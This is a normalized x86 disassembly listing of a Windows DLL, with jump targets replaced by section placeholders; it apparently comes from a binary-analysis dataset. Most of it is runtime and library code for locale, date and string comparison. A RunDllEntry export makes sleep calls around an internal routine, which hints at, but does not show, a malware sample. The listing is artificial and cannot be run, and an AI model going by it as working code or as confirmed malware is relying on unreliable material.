push ebx
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov [ ebp - 0x8 ] edi
call [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
mov ebx [ ebp + 0x24 ]
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042e7f
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037ee7
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037ee7
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10038079
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
lea edi [ ebx + 0x10 ]
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x8 ]
call sub_100461d4
or [ esi ] eax
add esp 0x18
dec [ edi ]
mov edi [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10038079
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10041452
jmp r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100461d4
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037ee7
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042e7f
cmp [ ebp - 0x4 ] 0x4
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037ee7
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10037f31
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
lea edi [ ebx + 0x10 ]
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x8 ]
call sub_100461d4
or [ esi ] eax
add esp 0x18
dec [ edi ]
mov edi [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100461d4
add esp 0x18
or [ esi ] eax
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10042e7f
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10037f0b
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
lea edi [ ebx + 0x10 ]
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x8 ]
call sub_100461d4
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10041452
jmp r-xdata
add ebx 0xc
push ebx
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_100461d4
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
sub_1004680b
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_100461d4
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
test [ ecx ] 0x2
jne r-xdata
mov edx 0x76c
cmp [ ebp - 0x4 ] edx
jl r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
mov eax [ ebp + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x87
jle r-xdata
sub [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0x2
mov [ ecx ] eax
sub_10046879
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10038094
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_100468b9
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10038094
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_100468f9
push 0x98
mov eax sub_1004836c
call sub_10023e33
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x5
pop eax
call sub_10023f0b
retn
cmp [ eax ] edi
jne r-xdata
push 0x1c
call sub_10020186
pop ecx
mov [ ebp - 0x14 ] eax
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_100076e4
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10046164
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_10007701
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100023ce
sub_100469a3
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100468f9
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_10046a40
push 0x4
mov eax sub_10048828
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov ebx [ ebp + 0xc ]
test bl 0x1
je r-xdata
test bl 0x20
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
and ebx 0x4
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_10044c1b
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_10044cb8
pop ecx
push eax
push 0x8
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_10044186
mov esi eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x10
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_10044d55
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_10044df2
pop ecx
push eax
push 0x10
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_100441eb
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
call sub_10023f0b
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_100469a3
pop ecx
push eax
push 0x1c
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1d
cmp ecx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1004420e
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_10044fc9
pop ecx
push eax
push 0x14
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
call sub_10046164
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_10044e8f
pop ecx
push eax
push 0x34
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x11
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1004424d
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_100444f4
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007328
push eax
push [ ebp + 0x14 ]
call sub_10044f2c
pop ecx
push eax
push 0x34
call sub_10020186
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x17
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
cmp ebx edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_10044540
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_1001da20
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007328
push eax
push esi
jmp r-xdata
sub_10046d1b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ebx [ eax ]
mov eax [ eax + 0x4 ]
call sub_100264e1
mov ebx [ eax + 0x4 ]
call sub_100264bb
jmp r-xdata
push eax
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push ebx
push 0x0
call sub_100376f4
add esp 0x20
test eax eax
jne r-xdata
cmp esi edi
mov eax esi
jl r-xdata
test ebx ebx
jne r-xdata
dec eax
dec eax
call sub_10026065
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10020a5a
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
cmp esi edi
je r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_10046dc4
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
mov [ ebp - 0x4 ] 0x0
lea edi [ ebp - 0x3 ]
stosb [ edi ]
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x22
call sub_100264e1
push [ eax + 0x14 ]
call [ GetLocaleInfoA@IAT ]
cmp [ ebp - 0x4 ] 0x30
pop edi
jne r-xdata
xor eax eax
cmp [ ebp - 0x4 ] 0x31
jne r-xdata
push 0x2
pop eax
leave
retn
cmp [ ebp - 0x4 ] 0x32
setne al
dec eax
and eax 0x3
leave
retn
inc eax
leave
retn
sub_10046e0f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
sar esi 0x1
sar edi 0x1
test eax eax
jne r-xdata
mov ebx [ eax ]
call sub_100264e1
mov ebx [ eax + 0x4 ]
jmp r-xdata
call sub_100264bb
push eax
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push ebx
push 0x0
call sub_10047062
add esp 0x20
test eax eax
jne r-xdata
cmp esi edi
mov edx esi
jl r-xdata
test ebx ebx
jne r-xdata
dec eax
dec eax
call sub_10026065
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
pop edi
pop esi
pop ebx
pop ebp
retn
test edx edx
jg r-xdata
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
xor eax eax
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
inc eax
inc eax
inc ecx
inc ecx
dec edx
cmp esi edi
je r-xdata
test eax eax
jne r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_10046ebd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
sub edi [ ebp + 0x8 ]
sar esi 0x1
sar edi 0x1
or ebx 0xffffffff
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_100264e1
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
call sub_10026ca5
pop ecx
mov [ ebp + 0x14 ] eax
test eax eax
je r-xdata
cmp esi edi
ja r-xdata
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
call sub_100264bb
push eax
push edi
push [ ebp + 0x14 ]
mov edi 0x400
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push 0x0
call sub_10026ff4
mov ebx eax
add esp 0x20
test ebx ebx
jne r-xdata
mov ebx esi
jmp r-xdata
lea eax [ esi + esi ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10026940
add esp 0xc
xor eax eax
test ebx ebx
jbe r-xdata
call sub_100264bb
push eax
xor eax eax
push eax
push eax
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push eax
call sub_10026ff4
mov ebx eax
add esp 0x20
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
call sub_100207fd
pop ecx
mov ecx [ ebp + 0x14 ]
movzx cx [ eax + ecx ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 2 ] cx
inc eax
cmp eax ebx
jb r-xdata
mov ebx 0x7fffffff
jmp r-xdata
sub_10046f96
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
xor edi edi
cmp eax edi
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
call sub_100264e1
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
call sub_100264bb
jmp r-xdata
push 0x1
push [ ebp + 0xc ]
push edi
push edi
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_100268cc
add esp 0x24
test eax eax
je r-xdata
cmp eax edi
jne r-xdata
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp eax ebx
mov [ ebp - 0x4 ] eax
jg r-xdata
cmp esi ebx
ja r-xdata
push 0x1
push [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_100268cc
add esp 0x24
mov [ ebp - 0x4 ] esi
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10026940
add esp 0xc
sub_10047042
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
inc eax
sub_10047062
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov esi [ ebp + 0x18 ]
mov edx [ ebp + 0x20 ]
test esi esi
jle r-xdata
test edx edx
jle r-xdata
mov eax [ ebp + 0x14 ]
push esi
call sub_10047042
pop ecx
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x1c ]
push edx
call sub_10047042
pop ecx
mov edx eax
sub esi edx
jne r-xdata
test edx edx
je r-xdata
xor eax eax
test esi esi
setge al
lea eax [ eax + eax + 0x1 ]
push 0x2
pop eax
jmp r-xdata
push edx
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ CompareStringW@IAT ]
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
sub_1004b420
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
pop esi
jmp edx
sub_1004b460
push ecx
push edi
mov edi [ rw-data ]
test edi edi
je r-xdata
pop edi
pop ecx
retn
push 0x0
lea ecx [ esp + 0x8 ]
call sub_1001b1bf
mov eax [ edi + 0x4 ]
test eax eax
jbe r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ esp + 0x8 ]
and esi edi
call sub_1001b1e7
test esi esi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
RunDllEntry
push esi
mov esi [ Sleep@IAT ]
mov [ rw-data ] 0x0
push 0x64
call esi
push [ rw-data ]
mov [ rw-data ] 0x1
call sub_100115d1
push 0x4e20
call esi
pop esi
retn
sub_100013b0
mov esi [ ebp + 0x8 ]
call sub_10001508
xor ebx ebx
push ebx
push ebx
call sub_10023a01
int3
sub_100013c2
push esi
mov esi eax
call sub_10001508
push [ esi ]
call sub_1002004f
pop ecx
pop esi
retn
sub_1000143b
push [ eax ]
call sub_1002004f
pop ecx
retn
sub_10001a13
push 0x8
mov eax sub_100492f2
call sub_10023e33
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
call sub_10023f0b
retn 0x4
push [ ebp + 0x8 ]
call sub_100020c6
sub_10001b92
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001baa
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10001c19
push esi
mov esi ecx
call sub_10001c35
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10001c35
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_100023ce
mov ecx esi
pop esi
jmp sub_100202c9
sub_10001c52
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001c35
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10001c74
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001be4
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10001cc8
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_100023ce
mov ecx esi
pop esi
jmp sub_100202c9
sub_10001d41
push esi
mov esi ecx
call sub_10001cc8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10001d5d
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ecx + 0x10 ]
retn
mov eax [ ecx + 0x10 ]
retn
sub_10001da0
push 0x0
push 0x1
call sub_100023ce
retn
sub_10001dd0
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
call sub_100203cb
add esp 0x10
retn
j_sub_10001def
jmp sub_10001def
sub_10001faf
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_10002597
push esi
push esi
call sub_10023a01
int3
sub_10002025
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
retn
mov eax [ ecx + 0x4 ]
retn
sub_10002244
push esi
lea eax [ esp + 0x8 ]
push eax
mov esi ecx
call sub_100201fc
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000225d
mov [ ecx ] r--data
jmp sub_100202c9
sub_10002268
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100202c9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_1000228a
push esi
